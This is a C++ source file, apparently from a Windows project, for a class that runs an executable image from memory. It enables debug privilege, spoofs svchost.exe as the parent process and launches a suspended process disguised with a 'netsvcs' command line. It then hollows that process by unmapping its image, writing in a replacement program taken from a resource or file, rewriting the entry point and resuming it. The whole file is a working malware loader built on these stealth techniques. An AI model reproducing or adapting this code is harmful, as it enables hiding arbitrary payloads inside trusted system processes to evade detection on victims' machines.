// MemRunExe.cpp: implementation of the CMemRunExe class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MemRunExe.h"
#include "TlHelp32.h"

//#pragma comment(lib,"lib/ntdll.lib")
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMemRunExe::CMemRunExe()
{

}

CMemRunExe::~CMemRunExe()
{

}

BOOL CMemRunExe::AddToken()
{
	///提升权限
	TOKEN_PRIVILEGES tkp;
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) 
	{
		//	MessageBox("OpenProcessToken failed!");
		return false;
	}
	if(! LookupPrivilegeValue(NULL, SE_DEBUG_NAME,&tkp.Privileges[0].Luid))//获得本地机唯一的标识
	{ 
		//	AfxMessageBox("从本地计算机提取权限失败！");
		CloseHandle(hToken);
		return false;
	}
	tkp.PrivilegeCount = 1;  
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0,(PTOKEN_PRIVILEGES) NULL, 0); //调整获得的权限
	if (GetLastError() != ERROR_SUCCESS) 
	{
		//	MessageBox("AdjustTokenPrivileges enable failed!");
		CloseHandle(hToken);
		return false;
	}
	CloseHandle(hToken);
	return true;
}

void	CMemRunExe::GetProcessIdByName(std::string process_name,DWORD &pid)
{
	HANDLE SnapShot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if(SnapShot==NULL)
	{ 
		return ;
	}

	PROCESSENTRY32 ProcessInfo;//声明进程信息变量
	ProcessInfo.dwSize=sizeof(ProcessInfo);//设置ProcessInfo的大小
	//返回系统中第一个进程的信息
	BOOL Status = Process32First(SnapShot,&ProcessInfo); 

	std::string		key_str;
	while(Status)
	{  
		if (_stricmp(process_name.c_str(),T2AString(ProcessInfo.szExeFile).c_str()) == 0)
		{
			pid = ProcessInfo.th32ProcessID;
			break;
		}

		Status = Process32Next(SnapShot,&ProcessInfo);
	}
	CloseHandle(SnapShot);
	return ;
}

BOOL CMemRunExe::LoadFun()
{

	HMODULE hm = LoadLibraryA("Kernel32.dll");

	m_InitializeProcThreadAttributeList = (INITIALIZEPROCTHREADATTRIBUTELIST)GetProcAddress(hm,"InitializeProcThreadAttributeList");
	m_UpdateProcThreadAttribute = (UPDATEPROCTHREADATTRIBUTE)GetProcAddress(hm,"UpdateProcThreadAttribute");
	m_DeleteProcThreadAttributeList = (DELETEPROCTHREADATTRIBUTELIST)GetProcAddress(hm,"DeleteProcThreadAttributeList");

	if (m_InitializeProcThreadAttributeList == NULL ||
		m_UpdateProcThreadAttribute == NULL ||
		m_DeleteProcThreadAttributeList == NULL)
	{
		return FALSE;
	}

	return TRUE;
}

BOOL	CMemRunExe::MyCreateProcess(std::string src_path,std::string work_dir,STARTUPINFOEXA &si,	PROCESS_INFORMATION &pi,bool bSysPrivilleg /*= true*/)
{
	DWORD  pid = 0;
	BOOL	create = FALSE;

	char		cmd_line[1024];
	memset(cmd_line,0,sizeof(cmd_line)); 
	sprintf_s(cmd_line,sizeof(cmd_line),"%s -k netsvcs",src_path.c_str());

	char		temp_work_dir[MAX_PATH];
	memset(temp_work_dir,0,sizeof(temp_work_dir));
	strcpy_s(temp_work_dir,sizeof(temp_work_dir),work_dir.c_str());

	/* 初始化结构体 */  
	ZeroMemory(&si,sizeof(si));  

	/* 设置结构体成员 */  
	si.StartupInfo.cb = sizeof(si);  

	/* 根据进程名获取任意进程Id */   
	GetProcessIdByName("svchost.exe",pid);  

	if(AddToken() == FALSE || LoadFun() == FALSE || bSysPrivilleg == false)
	{
		//XP，或者禁止获取调试权限的系统；走这里
		if (CreateProcessA(src_path.c_str(),cmd_line,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,temp_work_dir,(LPSTARTUPINFOA)&(si.StartupInfo),&pi)) 
		{
			create = TRUE;
		}  
		return create;
	}

	if (pid == 0)
	{
		return FALSE;
	}

	/* 已全部权限打开explorer.exe 进程 */
	HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);  
 
	SIZE_T lpsize = 0;  

	/* 用微软规定的特定的函数初始化结构体 */  
	m_InitializeProcThreadAttributeList(NULL,1,0,&lpsize);  

	char * temp = new char[lpsize];  

	/* 转换指针到正确类型 */  
	LPPROC_THREAD_ATTRIBUTE_LIST AttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)temp;  

	/* 真正为结构体初始化属性参数 */  
	m_InitializeProcThreadAttributeList(AttributeList,1,0,&lpsize);  

	/* 用已构造的属性结构体更新属性表 */  
	if (!m_UpdateProcThreadAttribute(AttributeList,0,PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &handle,sizeof(HANDLE),NULL,NULL))
	{   
		create = FALSE;
		return create;
	}  

	/* 移交指针，这里已更换了父进程的属性表是 explorer.exe */  
	si.lpAttributeList = AttributeList;  

	ZeroMemory(&pi, sizeof(pi));

	

	if (CreateProcessA(src_path.c_str(),cmd_line,NULL,NULL,FALSE,EXTENDED_STARTUPINFO_PRESENT|CREATE_SUSPENDED,NULL,temp_work_dir,(LPSTARTUPINFOA)&si,&pi)) 
	{
		create = TRUE;
	} 

	/* 处理后事 */  
	m_DeleteProcThreadAttributeList(AttributeList);  

	delete temp;
	return create;
}

DWORD	CMemRunExe::RunExe(std::string src_path,std::string work_dir,PVOID exe_buffer,DWORD exe_len,bool bSysPrivilleges /*= true*/)
{
	PIMAGE_DOS_HEADER pIDH;
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_SECTION_HEADER pISH;
	
	PVOID mem,base;
	
	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	CONTEXT ctx;
	
	ctx.ContextFlags = CONTEXT_FULL;
	
	memset(&si,0,sizeof(si));
	memset(&pi,0,sizeof(pi));

	 
	char		temp_work_dir[MAX_PATH];
	memset(temp_work_dir,0,sizeof(temp_work_dir));
	strcpy_s(temp_work_dir,sizeof(temp_work_dir),work_dir.c_str());

	/*
	if(!CreateProcess(NULL,cmd_line,NULL,NULL,FALSE,CREATE_SUSPENDED ,NULL,temp_work_dir,&si,&pi)) // Start the target application
	{ 
		//运行程序失败
		return 0;
	}
	*/
	if(!MyCreateProcess(src_path,work_dir,si,pi,bSysPrivilleges))
	{
		return 0;
	}
	 

	pIDH=(PIMAGE_DOS_HEADER)exe_buffer;
	
	if(pIDH->e_magic!=IMAGE_DOS_SIGNATURE) // Check for valid executable
	{
		//不是一个可执行文件
		NtTerminateProcess(pi.hProcess,1); // We failed, terminate the child process.
		return 0;
	}
	
	pINH=(PIMAGE_NT_HEADERS)((LPBYTE)exe_buffer + pIDH->e_lfanew); // Get the address of the IMAGE_NT_HEADERS
	
	NtGetContextThread(pi.hThread,&ctx); // Get the thread context of the child process's primary thread
	NtReadVirtualMemory(pi.hProcess,(PVOID)(ctx.Ebx + 8),&base,sizeof(PVOID),NULL); // Get the PEB address from the ebx register and read the base address of the executable image from the PEB
	
	if((DWORD)base == pINH->OptionalHeader.ImageBase) // If the original image has same base address as the replacement executable, unmap the original executable from the child process.
	{ 
		NtUnmapViewOfSection(pi.hProcess,base); // Unmap the executable image using NtUnmapViewOfSection function
	}
	  
	mem = VirtualAllocEx(pi.hProcess,(PVOID)pINH->OptionalHeader.ImageBase,pINH->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE); // Allocate memory for the executable image
	
	if(!mem)
	{ 
		NtTerminateProcess(pi.hProcess,1); // We failed, terminate the child process.
		return 0;
	}
	 
	
	NtWriteVirtualMemory(pi.hProcess,mem,exe_buffer,pINH->OptionalHeader.SizeOfHeaders,NULL); // Write the header of the replacement executable into child process
	
	for(int i = 0; i < pINH->FileHeader.NumberOfSections; i++)
	{
		pISH=(PIMAGE_SECTION_HEADER)((LPBYTE)exe_buffer+pIDH->e_lfanew+sizeof(IMAGE_NT_HEADERS)+(i*sizeof(IMAGE_SECTION_HEADER)));
		NtWriteVirtualMemory(pi.hProcess,(PVOID)((LPBYTE)mem+pISH->VirtualAddress),
			(PVOID)((LPBYTE)exe_buffer + pISH->PointerToRawData),
			pISH->SizeOfRawData,NULL); // Write the remaining sections of the replacement executable into child process
	}
	
	ctx.Eax=(DWORD)((LPBYTE)mem+pINH->OptionalHeader.AddressOfEntryPoint); // Set the eax register to the entry point of the injected image
	  
	NtWriteVirtualMemory(pi.hProcess,(PVOID)(ctx.Ebx+8),&pINH->OptionalHeader.ImageBase,sizeof(PVOID),NULL); // Write the base address of the injected image into the PEB
	 
	NtSetContextThread(pi.hThread,&ctx); // Set the thread context of the child process's primary thread
 
	
	NtResumeThread(pi.hThread,NULL); // Resume the primary thread
	 
 	NtClose(pi.hThread); // Close the thread handle
 	NtClose(pi.hProcess); // Close the process handle
	
	return pi.dwProcessId;
}

DWORD CMemRunExe::StartApp(LPCTSTR restype, int resid, HMODULE hModule,std::string src_exe,std::string work_dir)
{
	char	* file_buffer = NULL;
	DWORD		file_len = 0;
	DWORD	dwpid = 0;
	
	if (!ReadResData(&file_buffer,file_len,restype,resid,hModule))
	{
		return dwpid;
	}
	
	dwpid = RunExe(src_exe,work_dir,file_buffer,file_len);
	
	free(file_buffer);
	
	return dwpid;
	
}
	

DWORD CMemRunExe::StartApp(std::string path,std::string src_exe,std::string work_dir)
{
/*	FILE *fp;
	
	
	fp = fopen(path.c_str(), "rb");
	//读取文件内容
	fseek(fp, 0, SEEK_END);
	DWORD fileSize = ftell(fp);
	fseek(fp, 0, SEEK_SET);
	char	* file_buffer = (char*)malloc(fileSize);
	
	memset(file_buffer,0,fileSize);
	
	DWORD read_size = fread(file_buffer,1,fileSize,fp);	
	fseek(fp, 0, SEEK_SET);
	fclose(fp);
	
	if (read_size != fileSize || fileSize == 0)
	{
		free(file_buffer);
		return NULL;
	}*/
	DWORD	dwpid = 0;

	CToolOper	oper;
	DWORD		len = 0;

	oper.ReadLocalFile(path.c_str(),NULL,len);

	if (len == 0)
	{
		return 0;
	}

	char	*file_buffer = (char*)malloc(len);
	if (file_buffer == NULL)
	{
		return 0;
	}

	if(oper.ReadLocalFile(path.c_str(),file_buffer,len) != NOERROR)
		return 0;

	
	dwpid = RunExe(src_exe,work_dir,file_buffer,len);

	free(file_buffer);
	file_buffer = NULL;

	return dwpid;
}



BOOL CMemRunExe::ReadResData(char **data_buffer,DWORD &data_len,LPCTSTR restype, int resid, HMODULE hModule)
{
	HRSRC hRes;
	HGLOBAL hFileData;
	
	hRes = FindResource(hModule, MAKEINTRESOURCE(resid), restype);
	if(hRes)
	{
		hFileData = LoadResource(hModule, hRes);
		if(hFileData)
		{
			DWORD dwSize = SizeofResource(hModule, hRes);
			if(dwSize)
			{
				*data_buffer = (char *)malloc(dwSize);
				memset(*data_buffer,0,dwSize);
				
				memcpy(*data_buffer,hFileData,dwSize);
				data_len = dwSize;
				
				return TRUE;
			}
		}
	} 
	return FALSE;
}